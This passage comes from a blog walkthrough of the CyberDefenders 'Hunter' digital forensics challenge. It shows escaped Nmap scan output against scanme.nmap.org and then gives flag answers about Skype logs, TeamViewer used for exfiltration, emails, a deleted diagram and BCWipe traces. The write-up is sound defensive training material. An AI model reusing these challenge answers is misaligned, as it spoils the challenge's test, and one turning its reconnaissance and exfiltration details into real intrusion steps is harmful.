services=\u0026#34;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389\u0026#34; protocol=\u0026#34;tcp\u0026#34; numservices=\u0026#34;1000\u0026#34; type=\u0026#34;syn\u0026#34;\u0026gt;\u0026lt;/scaninfo\u0026gt;\u0026lt;verbose level=\u0026#34;1\u0026#34;\u0026gt;\u0026lt;/verbose\u0026gt;\u0026lt;debugging level=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;/debugging\u0026gt;\u0026lt;output type=\u0026#34;interactive\u0026#34;\u0026gt; Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-21 05:10 Pacific Daylight Time NSE: Loaded 138 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 05:10 Completed NSE at 05:10, 0.08s elapsed Initiating NSE at 05:10 Completed NSE at 05:10, 0.01s elapsed Initiating Ping Scan at 05:10 Scanning scanme.nmap.org (45.33.32.156) [4 ports] Completed Ping Scan at 05:10, 0.05s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 05:10 Completed Parallel DNS resolution of 1 host. at 05:10, 0.22s elapsed Initiating SYN Stealth Scan at 05:10 Scanning scanme.nmap.org (45.33.32.156) [1000 ports] Discovered open port 80/tcp on 45.33.32.156 Discovered open port 22/tcp on 45.33.32.156 Discovered open port 9929/tcp on 45.33.32.156 Discovered open port 31337/tcp on 45.33.32.156 Completed SYN Stealth Scan at 05:11, 12.69s elapsed (1000 total ports) Initiating Service scan at 05:11 Scanning 4 services on scanme.nmap.org (45.33.32.156) Completed Service scan at 05:11, 28.99s elapsed (4 services on 1 host) Initiating OS detection (try #1) against scanme.nmap.org (45.33.32.156) Retrying OS detection (try #2) against scanme.nmap.org (45.33.32.156) Retrying OS detection (try #3) against scanme.nmap.org (45.33.32.156) Retrying OS detection (try #4) against scanme.nmap.org (45.33.32.156) Retrying OS detection (try #5) against scanme.nmap.org (45.33.32.156) Initiating Traceroute at 05:11 Completed Traceroute at 05:11, 0.01s elapsed Initiating Parallel DNS resolution of 2 hosts. at 05:11 Completed Parallel DNS resolution of 2 hosts. at 05:12, 13.00s elapsed NSE: Script scanning 45.33.32.156. Initiating NSE at 05:12 Completed NSE at 05:12, 4.75s elapsed Initiating NSE at 05:12 Completed NSE at 05:12, 0.00s elapsed Nmap scan report for scanme.nmap.org (45.33.32.156) Host is up (0.011s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 ac:00:a0:1a:82:ff:cc:55:99:dc:67:2b:34:97:6b:75 (DSA) |_ 256 96:02:bb:5e:57:54:1c:4e:45:2f:56:4c:4a:24:b2:57 (ECDSA) 25/tcp filtered smtp 26/tcp filtered rsftp 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 156515DA3C0F7DC6B2493BD5CE43F795 | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Go ahead and ScanMe! 9929/tcp open nping-echo Nping echo 31337/tcp open ssl/ncat-chat Ncat chat (users: nobody) | ssl-cert: Subject: commonName=localhost | Issuer: commonName=localhost | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2016-06-21T04:01:25 | Not valid after: 2017-06-21T04:01:25 | MD5: d99f 9f02 30cf 3c59 1758 f83d bb2d b1a9 |_SHA-1: 1543 c4be b900 b059 998e 692f cf70 12f5 cf91 eda1 |_ssl-date: TLS randomness does not represent time No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.12%E=4%D=6/21%OT=22%CT=1%CU=37741%PV=N%DS=2%DC=T%G=Y%TM=57692F1 OS:9%P=i686-pc-windows-windows)SEQ(SP=14%GCD=FA00%ISR=9D%TI=I%CI=RD%TS=U)SE OS:Q(SP=12%GCD=FA00%ISR=9C%CI=RD%TS=U)OPS(O1=M5B4%O2=M5B4%O3=M5B4%O4=M5B4%O OS:5=M5B4%O6=M5B4)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R OS:=Y%DF=N%T=41%W=FFFF%O=M5B4%CC=N%Q=)ECN(R=N)T1(R=Y%DF=N%T=41%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=Y%DF=N%T=100%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=N%T=10 OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T4(R=Y%DF=N%T=100%W=0%S=A%A=Z%F=R%O=%RD=0 OS:%Q=)T5(R=Y%DF=N%T=100%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=100%W=0 OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=100%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)U1 OS:(R=Y%DF=N%T=34%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 1.00 ms 10.0.2.2 2 1.00 ms scanme.nmap.org (45.33.32.156) NSE: Script Post-scanning. Initiating NSE at 05:12 Completed NSE at 05:12, 0.00s elapsed Initiating NSE at 05:12 Completed NSE at 05:12, 0.00s elapsed Read data files from: C:\\Program Files (x86)\\Nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 87.13 seconds Raw packets sent: 1331 (66.198KB) | Rcvd: 1445 (64.387KB) \u0026lt;/output\u0026gt;\u0026lt;host comment=\u0026#34;\u0026#34;\u0026gt;\u0026lt;status state=\u0026#34;up\u0026#34;\u0026gt;\u0026lt;/status\u0026gt;\u0026lt;address addrtype=\u0026#34;ipv4\u0026#34; vendor=\u0026#34;\u0026#34; addr=\u0026#34;45.33.32.156\u0026#34;\u0026gt;\u0026lt;/address\u0026gt;\u0026lt;hostnames\u0026gt;\u0026lt;hostname type=\u0026#34;user\u0026#34; name=\u0026#34;scanme.nmap.org\u0026#34;\u0026gt;\u0026lt;/hostname\u0026gt;\u0026lt;hostname type=\u0026#34;PTR\u0026#34; name=\u0026#34;scanme.nmap.org\u0026#34;\u0026gt;\u0026lt;/hostname\u0026gt;\u0026lt;/hostnames\u0026gt;\u0026lt;ports\u0026gt;\u0026lt;extraports count=\u0026#34;994\u0026#34; state=\u0026#34;closed\u0026#34;\u0026gt;\u0026lt;/extraports\u0026gt;\u0026lt;port protocol=\u0026#34;tcp\u0026#34; portid=\u0026#34;22\u0026#34;\u0026gt;\u0026lt;state reason=\u0026#34;syn-ack\u0026#34; state=\u0026#34;open\u0026#34; reason_ttl=\u0026#34;64\u0026#34;\u0026gt;\u0026lt;/state\u0026gt;\u0026lt;service product=\u0026#34;OpenSSH\u0026#34; name=\u0026#34;ssh\u0026#34; extrainfo=\u0026#34;Ubuntu Linux; protocol 2.0\u0026#34; version=\u0026#34;6.6.1p1 Ubuntu 2ubuntu2.7\u0026#34; conf=\u0026#34;10\u0026#34; method=\u0026#34;probed\u0026#34;\u0026gt;\u0026lt;/service\u0026gt;\u0026lt;/port\u0026gt;\u0026lt;port protocol=\u0026#34;tcp\u0026#34; portid=\u0026#34;25\u0026#34;\u0026gt;\u0026lt;state reason=\u0026#34;no-response\u0026#34; state=\u0026#34;filtered\u0026#34; reason_ttl=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;/state\u0026gt;\u0026lt;service method=\u0026#34;table\u0026#34; conf=\u0026#34;3\u0026#34; name=\u0026#34;smtp\u0026#34;\u0026gt;\u0026lt;/service\u0026gt;\u0026lt;/port\u0026gt;\u0026lt;port protocol=\u0026#34;tcp\u0026#34; portid=\u0026#34;26\u0026#34;\u0026gt;\u0026lt;state reason=\u0026#34;no-response\u0026#34; state=\u0026#34;filtered\u0026#34; reason_ttl=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;/state\u0026gt;\u0026lt;service method=\u0026#34;table\u0026#34; conf=\u0026#34;3\u0026#34; name=\u0026#34;rsftp\u0026#34;\u0026gt;\u0026lt;/service\u0026gt;\u0026lt;/port\u0026gt;\u0026lt;port protocol=\u0026#34;tcp\u0026#34; portid=\u0026#34;80\u0026#34;\u0026gt;\u0026lt;state reason=\u0026#34;syn-ack\u0026#34; state=\u0026#34;open\u0026#34; reason_ttl=\u0026#34;64\u0026#34;\u0026gt;\u0026lt;/state\u0026gt;\u0026lt;service product=\u0026#34;Apache httpd\u0026#34; name=\u0026#34;http\u0026#34; extrainfo=\u0026#34;(Ubuntu)\u0026#34; version=\u0026#34;2.4.7\u0026#34; conf=\u0026#34;10\u0026#34; method=\u0026#34;probed\u0026#34;\u0026gt;\u0026lt;/service\u0026gt;\u0026lt;/port\u0026gt;\u0026lt;port protocol=\u0026#34;tcp\u0026#34; portid=\u0026#34;9929\u0026#34;\u0026gt;\u0026lt;state reason=\u0026#34;syn-ack\u0026#34; state=\u0026#34;open\u0026#34; reason_ttl=\u0026#34;64\u0026#34;\u0026gt;\u0026lt;/state\u0026gt;\u0026lt;service product=\u0026#34;Nping echo\u0026#34; method=\u0026#34;probed\u0026#34; conf=\u0026#34;10\u0026#34; name=\u0026#34;nping-echo\u0026#34;\u0026gt;\u0026lt;/service\u0026gt;\u0026lt;/port\u0026gt;\u0026lt;port protocol=\u0026#34;tcp\u0026#34; portid=\u0026#34;31337\u0026#34;\u0026gt;\u0026lt;state reason=\u0026#34;syn-ack\u0026#34; state=\u0026#34;open\u0026#34; reason_ttl=\u0026#34;64\u0026#34;\u0026gt;\u0026lt;/state\u0026gt;\u0026lt;service product=\u0026#34;Ncat chat\u0026#34; extrainfo=\u0026#34;users: nobody\u0026#34; method=\u0026#34;probed\u0026#34; conf=\u0026#34;10\u0026#34; name=\u0026#34;ncat-chat\u0026#34;\u0026gt;\u0026lt;/service\u0026gt;\u0026lt;/port\u0026gt;\u0026lt;/ports\u0026gt;\u0026lt;os\u0026gt;\u0026lt;portused state=\u0026#34;open\u0026#34; portid=\u0026#34;22\u0026#34; proto=\u0026#34;tcp\u0026#34;\u0026gt;\u0026lt;/portused\u0026gt;\u0026lt;portused state=\u0026#34;closed\u0026#34; portid=\u0026#34;1\u0026#34; proto=\u0026#34;tcp\u0026#34;\u0026gt;\u0026lt;/portused\u0026gt;\u0026lt;portused state=\u0026#34;closed\u0026#34; portid=\u0026#34;37741\u0026#34; proto=\u0026#34;udp\u0026#34;\u0026gt;\u0026lt;/portused\u0026gt;\u0026lt;osmatch line=\u0026#34;84526\u0026#34; name=\u0026#34;QEMU user mode network gateway\u0026#34; accuracy=\u0026#34;96\u0026#34;\u0026gt;\u0026lt;osclass type=\u0026#34;general purpose\u0026#34; osfamily=\u0026#34;QEMU\u0026#34; vendor=\u0026#34;QEMU\u0026#34; osgen=\u0026#34;\u0026#34; accuracy=\u0026#34;96\u0026#34;\u0026gt;\u0026lt;/osclass\u0026gt;\u0026lt;/osmatch\u0026gt;\u0026lt;osmatch line=\u0026#34;27173\u0026#34; name=\u0026#34;GNU Hurd 0.3\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;osclass type=\u0026#34;general purpose\u0026#34; osfamily=\u0026#34;Hurd\u0026#34; vendor=\u0026#34;GNU\u0026#34; osgen=\u0026#34;\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;/osclass\u0026gt;\u0026lt;/osmatch\u0026gt;\u0026lt;osmatch line=\u0026#34;2383\u0026#34; name=\u0026#34;Allied Telesyn AT-9006SX/SC switch\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;osclass type=\u0026#34;switch\u0026#34; osfamily=\u0026#34;embedded\u0026#34; vendor=\u0026#34;Allied Telesyn\u0026#34; osgen=\u0026#34;\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;/osclass\u0026gt;\u0026lt;/osmatch\u0026gt;\u0026lt;osmatch line=\u0026#34;8655\u0026#34; name=\u0026#34;Bay Networks BayStack 450 switch (software version 3.1.0.22)\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;osclass type=\u0026#34;switch\u0026#34; osfamily=\u0026#34;embedded\u0026#34; vendor=\u0026#34;Bay Networks\u0026#34; osgen=\u0026#34;\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;/osclass\u0026gt;\u0026lt;/osmatch\u0026gt;\u0026lt;osmatch line=\u0026#34;8673\u0026#34; name=\u0026#34;Bay Networks BayStack 450 switch (software version 4.2.0.16)\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;osclass type=\u0026#34;switch\u0026#34; osfamily=\u0026#34;embedded\u0026#34; vendor=\u0026#34;Bay Networks\u0026#34; osgen=\u0026#34;\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;/osclass\u0026gt;\u0026lt;/osmatch\u0026gt;\u0026lt;osmatch line=\u0026#34;11315\u0026#34; name=\u0026#34;Cabletron ELS100-24TXM Switch or Icom IC-7800 radio transceiver\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;osclass type=\u0026#34;specialized\u0026#34; osfamily=\u0026#34;embedded\u0026#34; vendor=\u0026#34;Icom\u0026#34; osgen=\u0026#34;\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;/osclass\u0026gt;\u0026lt;/osmatch\u0026gt;\u0026lt;osmatch line=\u0026#34;13078\u0026#34; name=\u0026#34;Cisco Catalyst 1900 switch or RAD IPMUX-1 TDM-over-IP multiplexer\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;osclass type=\u0026#34;switch\u0026#34; osfamily=\u0026#34;embedded\u0026#34; vendor=\u0026#34;RAD Data Communications\u0026#34; osgen=\u0026#34;\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;/osclass\u0026gt;\u0026lt;/osmatch\u0026gt;\u0026lt;osmatch line=\u0026#34;82858\u0026#34; name=\u0026#34;Oracle Virtualbox\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;osclass type=\u0026#34;bridge\u0026#34; osfamily=\u0026#34;Virtualbox\u0026#34; vendor=\u0026#34;Oracle\u0026#34; osgen=\u0026#34;\u0026#34; accuracy=\u0026#34;87\u0026#34;\u0026gt;\u0026lt;/osclass\u0026gt;\u0026lt;/osmatch\u0026gt;\u0026lt;osmatch line=\u0026#34;40192\u0026#34; name=\u0026#34;TiVo series 1 (Sony SVR-2000 or Philips HDR112) (Linux 2.1.24-TiVo-2.5, PowerPC)\u0026#34; accuracy=\u0026#34;86\u0026#34;\u0026gt;\u0026lt;osclass type=\u0026#34;media device\u0026#34; osfamily=\u0026#34;embedded\u0026#34; vendor=\u0026#34;Sony\u0026#34; osgen=\u0026#34;\u0026#34; accuracy=\u0026#34;86\u0026#34;\u0026gt;\u0026lt;/osclass\u0026gt;\u0026lt;/osmatch\u0026gt;\u0026lt;osmatch line=\u0026#34;37456\u0026#34; name=\u0026#34;Konica Minolta 7035 printer\u0026#34; accuracy=\u0026#34;86\u0026#34;\u0026gt;\u0026lt;osclass type=\u0026#34;printer\u0026#34; osfamily=\u0026#34;embedded\u0026#34; vendor=\u0026#34;Konica Minolta\u0026#34; osgen=\u0026#34;\u0026#34; accuracy=\u0026#34;86\u0026#34;\u0026gt;\u0026lt;/osclass\u0026gt;\u0026lt;/osmatch\u0026gt;\u0026lt;/os\u0026gt;\u0026lt;uptime lastboot=\u0026#34;\u0026#34; seconds=\u0026#34;\u0026#34;\u0026gt;\u0026lt;/uptime\u0026gt;\u0026lt;tcpsequence index=\u0026#34;\u0026#34; values=\u0026#34;\u0026#34; difficulty=\u0026#34;\u0026#34;\u0026gt;\u0026lt;/tcpsequence\u0026gt;\u0026lt;ipidsequence values=\u0026#34;\u0026#34; class=\u0026#34;\u0026#34;\u0026gt;\u0026lt;/ipidsequence\u0026gt;\u0026lt;tcptssequence values=\u0026#34;\u0026#34; class=\u0026#34;\u0026#34;\u0026gt;\u0026lt;/tcptssequence\u0026gt;\u0026lt;trace port=\u0026#34;80\u0026#34; proto=\u0026#34;tcp\u0026#34;\u0026gt;\u0026lt;hop rtt=\u0026#34;1.00\u0026#34; host=\u0026#34;\u0026#34; ipaddr=\u0026#34;10.0.2.2\u0026#34; ttl=\u0026#34;1\u0026#34;\u0026gt;\u0026lt;/hop\u0026gt;\u0026lt;hop rtt=\u0026#34;1.00\u0026#34; host=\u0026#34;scanme.nmap.org\u0026#34; ipaddr=\u0026#34;45.33.32.156\u0026#34; ttl=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;/hop\u0026gt;\u0026lt;/trace\u0026gt;\u0026lt;/host\u0026gt;\u0026lt;runstats\u0026gt;\u0026lt;finished timestr=\u0026#34;Tue Jun 21 05:12:09 2016\u0026#34; time=\u0026#34;1466511129\u0026#34;\u0026gt;\u0026lt;/finished\u0026gt;\u0026lt;hosts down=\u0026#34;0\u0026#34; total=\u0026#34;1\u0026#34; up=\u0026#34;1\u0026#34;\u0026gt;\u0026lt;/hosts\u0026gt;\u0026lt;/runstats\u0026gt;\u0026lt;/nmaprun\u0026gt; ::: 如果覺得太冗又很難看可以丟到online xml parser 就會看到結束的時間 :::spoiler Flag Flag: Tue Jun 21 05:12:09 2016 :::\nReference # 第二章、簡易網路基礎架構 第十六章、簡易 DHCP 伺服器設定\nCyberdefenders.org Hunter Walkthrough \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCyberdefenders.org Hunter Walkthrough\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":78,"href":"/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-2/","title":"CyberDefender - Hunter (Part 2)","section":"Securities","content":" CyberDefender - Hunter (Part 2) # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/32 Part 1: https://hackmd.io/@SBK6401/By1BpZIf6 Part 3: https://hackmd.io/@SBK6401/HylP8ixQp\n:::spoiler TOC [TOC] :::\nTools # PST Viewer xml parser DB Browser for SQLlite ==Q11== # How many ports were scanned?\nExploit # 呈上題 :::spoiler Flag Flag: 1000 :::\n==Q12== # What ports were found \u0026ldquo;open\u0026rdquo;?(comma-separated, ascending)\nExploit # 呈上題 :::spoiler Flag Flag: 22,80,9929,31337 :::\n==Q13== # What was the version of the network scanner running on this computer?\nExploit # 呈上題 :::spoiler Flag Flag: 7.12 :::\n==Q14== # The employee engaged in a Skype conversation with someone. What is the skype username of the other party?\nRecon # 直覺要先找到skype相關的文件放在哪邊，看了1的說明才知道是放在\\root\\Users\\Hunter\\AppData\\Roaming\\Skype\\hunterehpt，而所有和對話、帳戶等訊息都放在main.db這個檔案中 Exploit # 又是使用新工具的時候(DB Browser for SQLlite)，直接看Message這個table，一開始就講到了兩個名字$\\to$linux-rul3z和hunterehpt :::spoiler Flag Flag: linux-rul3z :::\n==Q15== # What is the name of the application both parties agreed to use to exfiltrate data and provide remote access for the external attacker in their Skype conversation?\nExploit # 呈上題 觀察兩者的對話紀錄就知道是teamviewer\n:::spoiler Flag Flag: teamviewer :::\n==Q16== # What is the Gmail email address of the suspect employee?\nExploit # 呈上題 直覺會從其他的table撈資料，我找到一個Contacts的table，裡面就有hunter自己本身的gmail address\n:::spoiler Flag Flag: ehptmsgs@gmail.com :::\n==Q17== # It looks like the suspect user deleted an important diagram after his conversation with the external attacker. What is the file name of the deleted diagram?\nRecon # 這一題完全沒有想法，也是看了1才知道，他先找到了outlook的backup file，在\\root\\Users\\Hunter\\Documents\\Outlook Files中有一個pst file，可以用線上工具去parse，然後就可以看到email之間的通訊紀錄\nExploit # 在important的folder中可以發現一張網路架構圖，應該就是這一題的答案，回推原本在skype上的時間，兩人互相道別的時候是2016/06/21 08:48:56，接著就轉而用email互相通訊，包含附上network design和制訂如何洩漏檔案出去之類的事情 :::spoiler Flag Flag: home-network-design-networking-for-a-single-family-home-case-house-arkko-1433-x-792.jpg :::\n==Q18== # The user Documents\u0026rsquo; directory contained a PDF file discussing data exfiltration techniques. What is the name of the file?\nRecon # Exploit # 仔細看一下Document裡面的一些pdf，會看到有一個叫做Ryan_VanAntwerp_thesis.pdf就是答案 :::spoiler Flag Flag: Ryan_VanAntwerp_thesis.pdf :::\n==Q19== # What was the name of the Disk Encryption application Installed on the victim system? (two words space separated)\nRecon # 題目要求找出磁碟加密的軟體名稱是甚麼，看到的第一直覺是想要找出駭客在受害者電腦安裝的軟體有哪些，首先看到BCWipe，根據軟體王的介紹\n這個軟體提供了許多種的安全級別來讓你選擇所要清除的文件文件。 別認為把 Windows 的資源回收筒清掉就算將文件都刪除了而放心？然而這些文件大多仍然存在你的電腦的硬碟中，隨時都可能被有心人士給取走。 而這個幫你把硬碟清的一乾二淨、絲毫不留痕。對於一些存有重要敏感文件的電腦，該軟體會是你一個強力而有力的文件清除工具。\n進到該資料夾可以看到有一個奇怪的log(==UnInstall.log==)，看了一下應該是有關卸載的初步資訊 :::spoiler UnInstall.log\nC 0 6/21/2016 4:44 AM 8 0 AdmPrivRequired C 0 6/21/2016 4:44 AM 12 0 C:\\Program Files (x86)\\Jetico C 0 6/21/2016 4:44 AM 0 0 C:\\Program Files (x86)\\Jetico\\BCWipe C 0 6/21/2016 4:44 AM 6 0 BCWipe 6.0 C 0 6/21/2016 4:44 AM 80000001 0 C:\\Windows\\system32\\drivers\\bcswap.sys C 0 6/21/2016 4:44 AM 80000001 0 C:\\Windows\\system32\\drivers\\fsh.sys C 0 6/21/2016 4:44 AM 80000001 0 C:\\Windows\\system32\\drivers\\MftWipeFilter.sys C 0 6/21/2016 4:44 AM B 0 \u0026#34;C:\\Program Files (x86)\\Jetico\\BCWipe\\BCWipeTM.exe\u0026#34; uninstall C 0 6/21/2016 4:44 AM 12 0 C:\\Program Files (x86)\\Jetico\\Shared\\ C 0 6/21/2016 4:44 AM 1 0 C:\\Program Files (x86)\\Jetico\\Shared\\BCShExt.dll C 0 6/21/2016 4:44 AM 1 0 C:\\Program Files (x86)\\Jetico\\Shared\\BCWipe.dll C 0 6/21/2016 4:44 AM 1 0 C:\\Program Files (x86)\\Jetico\\Shared\\BCWipeLib2.dll C 0 6/21/2016 4:44 AM 12 0 C:\\Program Files (x86)\\Jetico\\Shared64\\ C 0 6/21/2016 4:44 AM 80000001 0 C:\\Program Files (x86)\\Jetico\\Shared64\\BCShExt.dll C 0 6/21/2016 4:44 AM 80000001 0 C:\\Program Files (x86)\\Jetico\\Shared64\\langfile2.dll C 0 6/21/2016 4:44 AM 1 0 C:\\Windows\\BCUnInstall.exe C 0 6/21/2016 4:44 AM 5 2 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\BCWipe.exe C 0 6/21/2016 4:44 AM 5 2 SOFTWARE\\Jetico C 0 6/21/2016 4:44 AM 5 1 SOFTWARE\\Jetico C 0 6/21/2016 4:44 AM 5 2 SOFTWARE\\Jetico\\BCWipe C 0 6/21/2016 4:44 AM 5 1 SOFTWARE\\Jetico\\BCWipe C 0 6/21/2016 4:44 AM 5 0 CLSID\\{7850a720-705f-11d0-a9eb-0080488625e5} C 0 6/21/2016 4:44 AM 5 0 *\\shellex\\ContextMenuHandlers\\BCShellMenu C 0 6/21/2016 4:44 AM 5 0 Drive\\shellex\\ContextMenuHandlers\\BCShellMenu C 0 6/21/2016 4:44 AM 5 0 Drive\\shellex\\PropertySheetHandlers\\BCShellPage C 0 6/21/2016 4:44 AM 5 0 Drive\\shellex\\DragDropHandlers\\BCShellMenu C 0 6/21/2016 4:44 AM 5 0 Folder\\shellex\\ContextMenuHandlers\\BCShellMenu C 0 6/21/2016 4:44 AM 5 0 Directory\\shellex\\DragDropHandlers\\BCShellMenu C 0 6/21/2016 4:44 AM 5 0 CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\Shell\\YBCWipe C 0 6/21/2016 4:44 AM 5 0 CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\Shell\\YBCWipe\\command C 0 6/21/2016 4:44 AM 80000005 0 CLSID\\{7850a720-705f-11d0-a9eb-0080488625e5} C 0 6/21/2016 4:44 AM 80000005 0 CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\Shell\\YBCWipe C 0 6/21/2016 4:44 AM 80000005 0 CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\Shell\\YBCWipe\\command C 0 6/21/2016 4:44 AM 5 2 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\BCWipe C 0 6/21/2016 4:44 AM 10 2 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\BCWipeTM Startup C 0 6/21/2016 4:44 AM 8000000A 0 BCSWAP C 0 6/21/2016 4:44 AM 5 2 SOFTWARE\\Jetico\\BCWipe\\Service\\LogOff C 0 6/21/2016 4:44 AM 5 2 SOFTWARE\\Jetico\\BCWipe\\Service\\Startup C 0 6/21/2016 4:44 AM 5 2 SOFTWARE\\Jetico\\BCWipe\\Service\\Terminate C 0 6/21/2016 4:44 AM 5 2 SOFTWARE\\Jetico\\BCWipe\\Service\\Startup1 C 0 6/21/2016 4:44 AM A 0 